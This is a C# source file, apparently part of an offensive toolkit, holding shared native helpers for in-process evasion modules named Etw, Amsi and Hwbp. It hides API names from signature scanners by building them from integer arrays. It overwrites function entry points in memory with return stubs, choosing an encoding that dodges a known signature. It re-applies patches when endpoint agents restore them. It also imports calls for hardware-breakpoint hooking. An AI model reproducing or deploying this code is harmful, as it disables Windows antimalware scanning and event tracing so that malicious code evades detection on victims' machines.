using System;
using System.Runtime.InteropServices;

namespace Nx
{
	/// <summary>
	/// Native plumbing shared by the in-process evasion modules (Etw, Amsi, Hwbp).
	///
	/// Two rules apply to everything here and to every caller, both of them learned
	/// the hard way:
	///
	///   * no module or export name is ever written as a char or string literal.
	///     csc bakes those into the assembly as a readable UTF-16 run, so the file
	///     ends up shipping the very strings the patch exists to hide. Names go in
	///     as int[] and are expanded at run time by Hidden().
	///
	///   * a write is never reported as successful on the strength of the call
	///     returning. Every patch is confirmed by reading the bytes back, and a
	///     later call re-applies it when an endpoint agent has restored the page.
	/// </summary>
	internal static class Native
	{
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern IntPtr GetModuleHandle(string lpModuleName);

		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern IntPtr LoadLibrary(string lpFileName);

		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

		[DllImport("kernel32.dll", SetLastError = true)]
		internal static extern bool VirtualProtect(IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

		[DllImport("kernel32.dll", SetLastError = true)]
		internal static extern IntPtr GetCurrentThread();

		[DllImport("kernel32.dll", SetLastError = true)]
		internal static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);

		[DllImport("kernel32.dll", SetLastError = true)]
		internal static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);

		[DllImport("kernel32.dll")]
		internal static extern IntPtr AddVectoredExceptionHandler(uint first, VehDelegate handler);

		[DllImport("kernel32.dll")]
		internal static extern uint RemoveVectoredExceptionHandler(IntPtr handle);

		internal const uint PAGE_EXECUTE_READWRITE = 0x40;

		/// <summary>
		/// PVECTORED_EXCEPTION_HANDLER. Stdcall on x86, which is what the default
		/// Winapi marshalling for a delegate in a DllImport already produces; on x64
		/// there is only one convention and it is ignored.
		/// </summary>
		internal delegate int VehDelegate(IntPtr exceptionPointers);

		/// <summary>True in a 64-bit process. Also tells us which CONTEXT layout,
		/// which stdcall cleanup and which pointer width applies.</summary>
		internal static bool X64
		{
			get { return IntPtr.Size == 8; }
		}

		/// <summary>
		/// Build a string from character codes at run time. Every module and export
		/// name in this assembly goes through here. Written as a literal they would
		/// be emitted verbatim into the file, which is exactly the blob a signature
		/// keys on.
		/// </summary>
		internal static string Hidden(int[] codes)
		{
			char[] c = new char[codes.Length];
			for (int i = 0; i < codes.Length; i++)
			{
				c[i] = (char)codes[i];
			}
			return new string(c);
		}

		/// <summary>Module base, loading the module first if it is not mapped yet.
		/// Returns IntPtr.Zero when it cannot be brought in at all.</summary>
		internal static IntPtr Module(int[] moduleName)
		{
			string name = Hidden(moduleName);
			IntPtr module = GetModuleHandle(name);
			if (module == IntPtr.Zero)
			{
				module = LoadLibrary(name);
			}
			return module;
		}

		/// <summary>Export address inside an already-resolved module, or
		/// IntPtr.Zero when this build does not export it.</summary>
		internal static IntPtr Export(IntPtr module, int[] exportName)
		{
			if (module == IntPtr.Zero)
			{
				return IntPtr.Zero;
			}
			return GetProcAddress(module, Hidden(exportName));
		}

		/// <summary>True when the bytes at addr already match stub.</summary>
		internal static bool Matches(IntPtr addr, byte[] stub)
		{
			for (int i = 0; i < stub.Length; i++)
			{
				if (Marshal.ReadByte(addr, i) != stub[i])
				{
					return false;
				}
			}
			return true;
		}

		/// <summary>
		/// Write stub at addr and read it back. Returns null on success, or a short
		/// reason on failure. A write that did not stick counts as a failure even
		/// though VirtualProtect and Marshal.Copy both returned normally -- an
		/// endpoint agent putting the page back is indistinguishable from success
		/// unless the bytes are checked.
		/// </summary>
		internal static string Patch(IntPtr addr, byte[] stub)
		{
			uint oldProtect;
			if (!VirtualProtect(addr, new IntPtr(stub.Length), PAGE_EXECUTE_READWRITE, out oldProtect))
			{
				return "VirtualProtect failed: " + Marshal.GetLastWin32Error();
			}

			Marshal.Copy(stub, 0, addr, stub.Length);

			uint ignored;
			VirtualProtect(addr, new IntPtr(stub.Length), oldProtect, out ignored);

			return Matches(addr, stub) ? null : "write did not stick";
		}

		/// <summary>
		/// "mov eax, imm32; ret" -- hands imm32 back to the caller.
		///
		/// x86 needs the argument-popping form: the targets are stdcall, so a plain
		/// ret would return to the caller with its arguments still on the stack and
		/// corrupt it on the next frame. argBytes is the size of the argument list
		/// and is ignored on x64, which passes them in registers.
		///
		/// Deliberately encoded as "mov eax, 0" rather than the "xor eax, eax" that
		/// every write-up uses: the two-byte form is a signatured stub.
		/// </summary>
		internal static byte[] StubRet(int value, int argBytes)
		{
			byte[] s;
			if (X64)
			{
				s = new byte[6];
				s[5] = 0xC3;                                 // ret
			}
			else
			{
				s = new byte[8];
				s[5] = 0xC2;                                 // ret imm16
				s[6] = (byte)(argBytes & 0xFF);
				s[7] = (byte)((argBytes >> 8) & 0xFF);
			}
			s[0] = 0xB8;                                     // mov eax, imm32
			s[1] = (byte)(value & 0xFF);
			s[2] = (byte)((value >> 8) & 0xFF);
			s[3] = (byte)((value >> 16) & 0xFF);
			s[4] = (byte)((value >> 24) & 0xFF);
			return s;
		}
	}
}
